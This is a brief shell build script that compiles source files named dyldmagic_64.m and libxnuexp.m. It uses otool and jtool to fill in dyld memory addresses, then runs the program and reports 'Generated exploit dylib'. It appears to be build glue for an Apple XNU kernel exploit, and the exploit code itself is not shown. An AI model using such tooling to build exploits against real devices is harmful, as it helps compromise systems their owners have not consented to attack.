SCRIPTPATH=`dirname $0`
cd $SCRIPTPATH
rm -f magic.dylib

if [ -z "$CC" ]; then CC=clang; fi
$CC dyldmagic_64.m -D _LDYLD_BSS="$(otool -l libdyld.dylib | grep __bss --after 2 | grep addr | while read a b; do echo $b; done)" -D _DYCACHE_BASE=0x"$(../../bin/jtool -v cache  |grep mapping | sed 's/  //g'|tr ' ' '\n' | grep mapping --after 2 | head -3|tail -1|tr -d -- '->')" -o main -framework Foundation libxnuexp.m -isysroot "$(xcrun --show-sdk-path)" && ./main && echo "Generated exploit dylib"
